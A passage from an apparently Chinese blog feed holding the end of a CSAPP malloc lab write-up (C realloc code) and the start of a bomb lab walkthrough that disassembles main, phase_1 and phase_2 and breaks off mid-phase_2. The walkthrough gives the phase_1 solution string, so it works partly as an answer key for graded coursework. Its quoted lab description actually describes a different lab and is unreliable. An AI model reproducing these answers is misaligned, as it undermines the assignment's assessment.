class="type">void</span> *newptr;</span><br><span class="line">   <span class="type">size_t</span> asize;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">      mm_free(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">   asize = size &lt;= DSIZE ? <span class="number">2</span> * DSIZE : DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (oldsize == asize) <span class="keyword">return</span> ptr;</span><br><span class="line">   <span class="keyword">if</span> (oldsize &lt; asize) &#123;</span><br><span class="line">      <span class="comment">//改进，直接合并再扩展</span></span><br><span class="line">      <span class="type">int</span> isnextFree;</span><br><span class="line">      <span class="type">char</span> *bp = realloc_coalesce(ptr, asize, &amp;isnextFree);</span><br><span class="line">      <span class="keyword">if</span> (isnextFree == <span class="number">1</span>) &#123; <span class="comment">/*next block is free*/</span></span><br><span class="line">         realloc_place(bp, asize);</span><br><span class="line">         <span class="keyword">return</span> bp;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isnextFree == <span class="number">0</span> &amp;&amp; bp != ptr) &#123;</span><br><span class="line">         <span class="comment">/*previous block is free, move the point to new address,and move the payload*/</span></span><br><span class="line">         <span class="built_in">memcpy</span>(bp, ptr, size);</span><br><span class="line">         realloc_place(bp, asize);</span><br><span class="line">         <span class="keyword">return</span> bp;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">/*realloc_coalesce is fail*/</span></span><br><span class="line">         newptr = mm_malloc(size);</span><br><span class="line">         <span class="built_in">memcpy</span>(newptr, ptr, size);</span><br><span class="line">         mm_free(ptr);</span><br><span class="line">         <span class="keyword">return</span> newptr;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      realloc_place(ptr, asize);</span><br><span class="line">      <span class="keyword">return</span> ptr;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据实验要求，在需要重新分配一块更大的内存块时，首先判断前后是否为空闲块，可以就地分配。相应的<code>place</code>和<code>coalesce</code>函数也要作出修改。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">realloc_place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">   <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">   <span class="keyword">if</span> ((csize - asize) &gt;= <span class="number">2</span> * DSIZE) &#123;</span><br><span class="line">      PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">      PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">      bp = NEXT_BLKP(bp);</span><br><span class="line"></span><br><span class="line">      PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">      PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">      PUT(NEXT_LINKNODE_RP(bp), <span class="number">0</span>);</span><br><span class="line">      PUT(PREV_LINKNODE_RP(bp), <span class="number">0</span>);</span><br><span class="line">      coalesce(bp);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">      PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">realloc_coalesce</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> newSize, <span class="type">int</span> *isNextFree)</span> &#123;</span><br><span class="line">   <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">   <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">   <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">   *isNextFree = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*prev_alloc &amp;&amp; next_alloc不做任何合并*/</span></span><br><span class="line">   <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">      <span class="keyword">if</span> (size &gt;= newSize) &#123;</span><br><span class="line">         del_block(NEXT_BLKP(bp));</span><br><span class="line">         PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">         PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">         *isNextFree = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">return</span> bp;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">      <span class="keyword">if</span> (size &gt;= newSize) &#123;</span><br><span class="line">         del_block(PREV_BLKP(bp));</span><br><span class="line">         PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">         PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">1</span>));</span><br><span class="line">         bp = PREV_BLKP(bp);</span><br><span class="line">         <span class="keyword">return</span> bp;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(FTRP(NEXT_BLKP(bp))) + GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">      <span class="keyword">if</span> (size &gt;= newSize) &#123;</span><br><span class="line">         del_block(PREV_BLKP(bp));</span><br><span class="line">         del_block(NEXT_BLKP(bp));</span><br><span class="line">         PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">1</span>));</span><br><span class="line">         PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">1</span>));</span><br><span class="line">         bp = PREV_BLKP(bp);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>realloc_place</code>函数省去了对空闲块的删除步骤，因为当前块在place之前并不是空闲块。<code>realloc_coalesce</code>则是接口发生了变化，记录了前后内存块的分配情况。如果没有前后空间可以合并或合并后仍然不能满足需求，则重新找空白块进行place。</p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><img src="https://img.lfalive.top/CSAPP-malloc/3.png" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP实验——bomb lab</title>
      <link href="/2021/12/05/CSAPP-bomb/"/>
      <url>/2021/12/05/CSAPP-bomb/</url>
      
        <content type="html"><![CDATA[<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1826663">《深入理解计算机系统》（CSAPP）实验二 —— Bomb Lab</a></p><p><a href="https://www.cnblogs.com/Tokubara/p/13909097.html">csapp(3e)的bomblab的phase_6详解(没有详细到逐行解析的程度)</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>bomb.c是本实验的源码，一共有phase_1 ~ phase_6 6个炸弹，从命令行输入的内容必须要和phase函数中的一致，否则就会爆炸退出程序。因为phase函数并没有给出源码，所以无法得知其期望的字符串是什么。</p><p>bomb文件是编译完成的文件，反汇编下这个文件，从反汇编推算下其内容是什么。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure><p>从main函数开始分析。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>da0 &lt;main&gt;:</span><br><span class="line">  <span class="number">400</span>da0:<span class="number">53</span>                   <span class="keyword">push</span>   %rbx                       <span class="meta"># saved register</span></span><br><span class="line">  <span class="number">400</span>da1:<span class="number">83</span> ff <span class="number">01</span>             cmp    $<span class="number">0x1</span>,%edi                  <span class="meta"># if(argc==1)</span></span><br><span class="line">  <span class="number">400</span>da4:<span class="number">75</span> <span class="number">10</span>                jne    <span class="number">400</span>db6 &lt;main+<span class="number">0x16</span>&gt;         <span class="meta"># 不相等 跳到400db6</span></span><br><span class="line">  <span class="number">400</span>da6:<span class="number">48</span> <span class="number">8</span>b <span class="number">05</span> <span class="number">9</span>b <span class="number">29</span> <span class="number">20</span> <span class="number">00</span> <span class="keyword">mov</span>    <span class="number">0x20299b</span>(%rip),%rax        <span class="meta"># 603748 &lt;stdin@@GLIBC_2.2.5&gt;</span></span><br><span class="line">  <span class="number">400</span>dad:<span class="number">48</span> <span class="number">89</span> <span class="number">05</span> b4 <span class="number">29</span> <span class="number">20</span> <span class="number">00</span> <span class="keyword">mov</span>    %rax,<span class="number">0x2029b4</span>(%rip)        <span class="meta"># 603768 &lt;infile&gt;</span></span><br><span class="line">  <span class="number">400</span>db4:eb <span class="number">63</span>                <span class="keyword">jmp</span>    <span class="number">400e19</span> &lt;main+<span class="number">0x79</span>&gt;         <span class="meta"># 跳到initialize_bomb</span></span><br><span class="line">  <span class="number">400</span>db6:<span class="number">48</span> <span class="number">89</span> f3             <span class="keyword">mov</span>    %rsi,%rbx</span><br><span class="line">  <span class="number">400</span>db9:<span class="number">83</span> ff <span class="number">02</span>             cmp    $<span class="number">0x2</span>,%edi                  <span class="meta"># if(argc==2)</span></span><br><span class="line">  <span class="number">400</span>dbc:<span class="number">75</span> <span class="number">3</span>a                jne    <span class="number">400</span>df8 &lt;main+<span class="number">0x58</span>&gt;         <span class="meta"># 不相等 跳到400df8</span></span><br><span class="line">  <span class="number">400</span>dbe:<span class="number">48</span> <span class="number">8</span>b <span class="number">7</span>e <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsi),%rdi</span><br><span class="line">  <span class="number">400</span>dc2:be b4 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4022b4</span>,%esi</span><br><span class="line">  <span class="number">400</span>dc7:e8 <span class="number">44</span> fe ff ff       callq  <span class="number">400</span>c10 &lt;fopen@plt&gt;</span><br><span class="line">  <span class="number">400</span>dcc:<span class="number">48</span> <span class="number">89</span> <span class="number">05</span> <span class="number">95</span> <span class="number">29</span> <span class="number">20</span> <span class="number">00</span> <span class="keyword">mov</span>    %rax,<span class="number">0x202995</span>(%rip)        <span class="meta"># 603768 &lt;infile&gt;</span></span><br><span class="line">  <span class="number">400</span>dd3:<span class="number">48</span> <span class="number">85</span> c0             test   %rax,%rax</span><br><span class="line">  <span class="number">400</span>dd6:<span class="number">75</span> <span class="number">41</span>                jne    <span class="number">400e19</span> &lt;main+<span class="number">0x79</span>&gt;         <span class="meta"># 跳到initialize_bomb</span></span><br><span class="line">  <span class="number">400</span>dd8:<span class="number">48</span> <span class="number">8</span>b <span class="number">4</span>b <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rcx</span><br><span class="line">  <span class="number">400</span>ddc:<span class="number">48</span> <span class="number">8</span>b <span class="number">13</span>             <span class="keyword">mov</span>    (%rbx),%rdx</span><br><span class="line">  <span class="number">400</span>ddf:be b6 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4022b6</span>,%esi</span><br><span class="line">  <span class="number">400</span>de4:bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">400</span>de9:e8 <span class="number">12</span> fe ff ff       callq  <span class="number">400</span>c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">400</span>dee:bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x8</span>,%edi</span><br><span class="line">  <span class="number">400</span>df3:e8 <span class="number">28</span> fe ff ff       callq  <span class="number">400</span>c20 &lt;exit@plt&gt;</span><br><span class="line">  <span class="number">400</span>df8:<span class="number">48</span> <span class="number">8</span>b <span class="number">16</span>             <span class="keyword">mov</span>    (%rsi),%rdx</span><br><span class="line">  <span class="number">400</span>dfb:be d3 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4022d3</span>,%esi</span><br><span class="line">  <span class="number">400e00</span>:bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">400e05</span>:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400e0</span>a:e8 f1 fd ff ff       callq  <span class="number">400</span>c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">400e0</span>f:bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x8</span>,%edi</span><br><span class="line">  <span class="number">400e14</span>:e8 <span class="number">07</span> fe ff ff       callq  <span class="number">400</span>c20 &lt;exit@plt&gt;</span><br><span class="line">  <span class="number">400e19</span>:e8 <span class="number">84</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4013</span>a2 &lt;initialize_bomb&gt;</span><br><span class="line">  <span class="number">400e1</span>e:bf <span class="number">38</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x402338</span>,%edi</span><br><span class="line">  <span class="number">400e23</span>:e8 e8 fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400e28</span>:bf <span class="number">78</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x402378</span>,%edi</span><br><span class="line">  <span class="number">400e2</span>d:e8 de fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400e32</span>:e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;         <span class="meta"># 读取输入</span></span><br><span class="line">  <span class="number">400e37</span>:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400e3</span>a:e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">400</span>ee0 &lt;phase_1&gt;           <span class="meta"># 调用phase_1</span></span><br><span class="line">  <span class="number">400e3</span>f:e8 <span class="number">80</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;     <span class="meta"># 接触phase_1</span></span><br><span class="line">  <span class="number">400e44</span>:bf a8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4023a8</span>,%edi</span><br><span class="line">  <span class="number">400e49</span>:e8 c2 fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400e4</span>e:e8 <span class="number">4</span>b <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">400e53</span>:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400e56</span>:e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">400</span>efc &lt;phase_2&gt;</span><br><span class="line">  <span class="number">400e5</span>b:e8 <span class="number">64</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">400e60</span>:bf ed <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4022ed</span>,%edi</span><br><span class="line">  <span class="number">400e65</span>:e8 a6 fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400e6</span>a:e8 <span class="number">2</span>f <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">400e6</span>f:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400e72</span>:e8 cc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">400</span>f43 &lt;phase_3&gt;</span><br><span class="line">  <span class="number">400e77</span>:e8 <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">400e7</span>c:bf <span class="number">0</span>b <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x40230b</span>,%edi</span><br><span class="line">  <span class="number">400e81</span>:e8 <span class="number">8</span>a fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400e86</span>:e8 <span class="number">13</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">400e8</span>b:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400e8</span>e:e8 <span class="number">79</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40100</span>c &lt;phase_4&gt;</span><br><span class="line">  <span class="number">400e93</span>:e8 <span class="number">2</span>c <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">400e98</span>:bf d8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x4023d8</span>,%edi</span><br><span class="line">  <span class="number">400e9</span>d:e8 <span class="number">6</span>e fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400</span>ea2:e8 f7 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">400</span>ea7:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400</span>eaa:e8 b3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">401062</span> &lt;phase_5&gt;</span><br><span class="line">  <span class="number">400</span>eaf:e8 <span class="number">10</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">400</span>eb4:bf <span class="number">1</span>a <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x40231a</span>,%edi</span><br><span class="line">  <span class="number">400</span>eb9:e8 <span class="number">52</span> fc ff ff       callq  <span class="number">400</span>b10 &lt;puts@plt&gt;</span><br><span class="line">  <span class="number">400</span>ebe:e8 db <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40149</span>e &lt;read_line&gt;</span><br><span class="line">  <span class="number">400</span>ec3:<span class="number">48</span> <span class="number">89</span> c7             <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  <span class="number">400</span>ec6:e8 <span class="number">29</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4010</span>f4 &lt;phase_6&gt;</span><br><span class="line">  <span class="number">400</span>ecb:e8 f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">4015</span>c4 &lt;phase_defused&gt;</span><br><span class="line">  <span class="number">400</span>ed0:b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">400</span>ed5:<span class="number">5</span>b                   <span class="keyword">pop</span>    %rbx</span><br><span class="line">  <span class="number">400</span>ed6:c3                   retq   </span><br></pre></td></tr></table></figure><p>说明主要还是看phase_1~phase_6函数。</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>ee0 &lt;phase_1&gt;:</span><br><span class="line">  <span class="number">400</span>ee0:<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          <span class="keyword">sub</span>    $<span class="number">0x8</span>,%rsp                     <span class="meta"># 栈指针 0x8</span></span><br><span class="line">  <span class="number">400</span>ee4:be <span class="number">00</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       <span class="keyword">mov</span>    $<span class="number">0x402400</span>,%esi                <span class="meta"># 传参</span></span><br><span class="line">  <span class="number">400</span>ee9:e8 <span class="number">4</span>a <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">401338</span> &lt;strings_not_equal&gt;    <span class="meta"># 判断字符串是否相等</span></span><br><span class="line">  <span class="number">400</span>eee:<span class="number">85</span> c0                test   %eax,%eax                     <span class="meta"># 测试返回结果</span></span><br><span class="line">  <span class="number">400</span>ef0:<span class="number">74</span> <span class="number">05</span>                je     <span class="number">400</span>ef7 &lt;phase_1+<span class="number">0x17</span>&gt;</span><br><span class="line">  <span class="number">400</span>ef2:e8 <span class="number">43</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;         <span class="meta"># 如果结果不对，调用炸弹爆炸</span></span><br><span class="line">  <span class="number">400</span>ef7:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          <span class="keyword">add</span>    $<span class="number">0x8</span>,%rsp                     <span class="meta"># 释放空间</span></span><br><span class="line">  <span class="number">400</span>efb:c3                   retq   </span><br></pre></td></tr></table></figure><p>在内存为0x402400的地方存储的就是程序期望我们输入的字符串，那么利用GDB工具调试下代码，打印0x402400处的值看下。得到正解。</p><blockquote><p>Border relations with Canada have never been better.</p></blockquote><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>efc &lt;phase_2&gt;:</span><br><span class="line">  <span class="number">400</span>efc:<span class="number">55</span>                   <span class="keyword">push</span>   %rbp</span><br><span class="line">  <span class="number">400</span>efd:<span class="number">53</span>                   <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">400</span>efe:<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          <span class="keyword">sub</span>    $<span class="number">0x28</span>,%rsp                    <span class="meta"># 栈指针 0x28</span></span><br><span class="line">  <span class="number">400</span>f02:<span class="number">48</span> <span class="number">89</span> e6             <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  <span class="number">400</span>f05:e8 <span class="number">52</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40145</span>c &lt;read_six_numbers&gt;     <span class="meta"># 调用 读入六个数字</span></span><br><span class="line">  <span class="number">400</span>f0a:<span class="number">83</span> <span class="number">3</span>c <span class="number">24</span> <span class="number">01</span>          cmpl   $<span class="number">0x1</span>,(%rsp)                   <span class="meta"># 比较1和(%rsp)的值</span></span><br><span class="line">  <span class="number">400</span>f0e:<span class="number">74</span> <span class="number">20</span>                je     <span class="number">400</span>f30 &lt;phase_2+<span class="number">0x34</span>&gt;         <span class="meta"># 相等就继续400f30</span></span><br><span class="line">  <span class="number">400</span>f10:e8 <span class="number">25</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;         <span class="meta"># explode_bomb</span></span><br><span class="line">  <span class="number">400</span>f15:eb <span class="number">19</span>                <span class="keyword">jmp</span>    <span class="number">400</span>f30 &lt;phase_2+<span class="number">0x34</span>&gt;         <span class="meta"># 跳到400f30</span></span><br><span class="line">  <span class="number">400</span>f17:<span class="number">8</span>b <span class="number">43</span> fc             <span class="keyword">mov</span>    <span class="number">-0x4</span>(%rbx),%eax</span><br><span class="line">  <span class="number">400</span>f1a:<span class="number">01</span> c0                <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  <span class="number">400</span>f1c:<span class="number">39</span> <span class="number">03</span>                cmp    %eax,(%rbx)</span><br><span class="line">  <span class="number">400</span>f1e:<span class="number">74</span> <span class="number">05</span>                je     <span class="number">400</span>f25 &lt;phase_2+<span class="number">0x29</span>&gt;         <span class="meta"># 相等就继续400f25</span></span><br><span class="line">  <span class="number">400</span>f20:e8 <span class="number">15</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       callq  <span class="number">40143</span>a &lt;explode_bomb&gt;         <span class="meta"># explode_bomb</span></span><br><span class="line">  <span class="number">400</span>f25:<span class="number">48</span> <span class="number">83</span> c3 <span class="number">04</span>          <span class="keyword">add</span>    $<span class="number">0x4</span>,%rbx</span><br><span class="line">  <span class="number">400</span>f29:<span class="number">48</span> <span class="number">39</span> eb             cmp    %rbp,%rbx</span><br><span class="line">  <span class="number">400</span>f2c:<span class="number">75</span> e9                jne    <span class="number">400</span>f17 &lt;phase_2+<span class="number">0x1b</span>&gt;         <span class="meta"># 不相等就跳到400f17</span></span><br><span class="line">  <span class="number">400</span>f2e:eb <span class="number">0</span>c                <span class="keyword">jmp</span>    <span class="number">400</span>f3c &lt;phase_2+<span class="number">0x40</span>&gt;         <span class="meta"># 跳到400f3c，结束phase_2</span></span><br><span class="line">  <span class="number">400</span>f30:<span class="number">48</span> <span class="number">8</span>d <span class="number">5</span>c <span class="number">24</span> <span class="number">04</span>       lea    <span class="number">0x4</span>(%rsp),%rbx</span><br><span class="line">  <span class="number">400</span>f35:<span class="number">48</span> <span class="number">8</span>d <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span>       lea    <span class="number">0x18</span>(%rsp),%rbp</span><br><span class="line">  <span class="number">400</span>f3a:eb db                <span class="keyword">jmp</span>    <span class="number">400</span>f17 &lt;phase_2+<span class="number">0x1b</span>&gt;         <span class="meta"># 跳到400f17</span></span><br><span class="line">  <span class="number">400</span>f3c:<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          <span class="keyword">add</span>    $<span class="number">0x28</span>,%rsp                    <span class="meta"># 释放空间</span></span><br><span class="line">  <span class="number">400</span>f40:<span class="number">5</span>b                   <span class="keyword">pop</span>    %rbx</span><br><span class="line">  <span class="number">400</span>f41:<span class="number">5</span>d                   <span class="keyword">pop</span>    %rbp</span><br><span class="line">  <span class="number">400</span>f42:c3                   retq   </span><br></pre></td></tr></table></figure><p>伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">phase_2:</span><br><span class="line"><span class="keyword">if</span>((%rsp)==<span class="number">1</span>) <span class="comment">//第一个数一定是1</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">goto</span> <span class="number">400f</span>30;</span><br><span class="line">   <span class="number">400f</span>17:</span><br><span class="line">   %eax = (%rbx - <span class="number">4</span>); <span class="comment">//%eax被赋予(%rbx - 4)地址的数据，最初为1</span></span><br><span class="line">   %eax *= <span class="number">2</span>; <span class="comment">//%eax翻倍</span></span><br><span class="line">   <span class="keyword">if</span>((%rbx) == %eax)</span><br><span class="line">      %rbx += <span class="number">0x4</span>; <span class="comment">//+4 下一地址</span></span><br><span class="line">      <span class="keyword">if</span>(%rbx == %rbp) <span class="keyword">return</span>; <span class="comment">//地址到达%rsp + 0x18</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">400f</span>17;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> explode_bomb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> explode_bomb;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">400f</span>30:</span><br><span class="line">%rbx = %rsp + <span class="number">0x4</span>;  </span><br><span class="line">%rbp = %rsp + <span class="number">0x18</span>; #结束条件存放在%rsp + <span class="number">0x18</span></span><br><span class="line"><span class="keyword">goto</span> <span class="number">400f</span>17;</span><br></pre></td></tr></table></figure><p>程序执行顺序大概是：</p><figure class="highlight 